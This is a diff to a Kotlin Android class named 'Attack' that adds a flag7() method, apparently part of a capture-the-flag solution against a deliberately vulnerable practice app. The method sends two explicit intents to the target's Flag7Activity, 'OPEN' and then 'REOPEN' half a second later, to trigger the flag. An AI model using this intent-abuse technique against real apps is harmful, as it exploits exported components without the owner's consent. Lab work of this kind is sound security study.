@@ -123,4 +123,24 @@ class Attack(private val context: Context) {
 		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
 		context.startActivity(intent)
 	}
+
+	fun flag7() {
+		val activityPath = "$packageName.activities.Flag7Activity"
+
+		val intent = Intent().apply {
+			setClassName(packageName, activityPath)
+			action = "OPEN"
+			flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
+		}
+		context.startActivity(intent)
+
+		Handler(Looper.getMainLooper()).postDelayed({
+			val newIntent = Intent().apply {
+				setClassName(packageName, activityPath)
+				action = "REOPEN"
+				flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
+			}
+			context.startActivity(newIntent)
+		}, 500)
+	}
 }
